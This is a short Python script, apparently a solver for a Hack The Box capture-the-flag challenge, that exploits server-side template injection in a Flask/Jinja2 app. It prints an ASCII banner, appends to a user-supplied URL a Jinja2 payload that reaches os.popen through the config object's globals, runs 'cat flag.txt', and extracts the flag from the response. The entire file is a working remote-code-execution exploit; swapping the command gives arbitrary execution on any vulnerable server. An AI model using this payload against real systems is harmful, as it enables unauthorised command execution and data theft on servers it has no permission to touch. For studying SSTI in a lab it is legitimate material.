#!/usr/bin/env python3
import argparse
import requests
import re

green = '\033[92m'
red = '\033[91m'
end = '\033[0m'
    

parser = argparse.ArgumentParser()
parser.add_argument('-u', help='url', dest='url')

args = parser.parse_args()


def banner():
    print ('''%s
HTB           
                    %s
--.--               %s|         |             |
  |  ,---.,-.-.,---.%s|    ,---.|--- ,---.,---|
  |  |---'| | ||   |%s|    ,---||    |---'|   |
  `  `---'` ' '|---'%s`---'`---^`---'`---'`---'
               |    %s                                                                                                              

RCE in Flask/Jinja2
-u for "URL"                                                                          
%s''' % (green, red, red,red,red,red,green,end))

banner()



if not args.url:
    print("please use - u for http://url")
else:
    payload = '{{config.__class__.__init__.__globals__[\'os\'].popen(\'cat flag.txt\').read()}}'
    r = requests.get(args.url+"/"+payload,timeout = 100)

    response = re.search('HTB{(.*)}',r.text)

    print("HTB{"+response.group(1)+"}")
